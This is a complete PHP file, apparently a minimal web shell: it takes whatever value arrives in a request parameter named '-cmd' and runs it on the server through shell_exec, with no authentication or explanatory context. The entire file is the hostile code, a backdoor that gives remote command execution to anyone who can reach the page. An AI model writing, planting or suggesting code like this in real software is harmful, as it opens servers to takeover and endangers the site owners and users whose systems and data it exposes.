<?php
$cmd = $_REQUEST["-cmd"];
if($cmd != "") 
	Shell_Exec($cmd);
?>

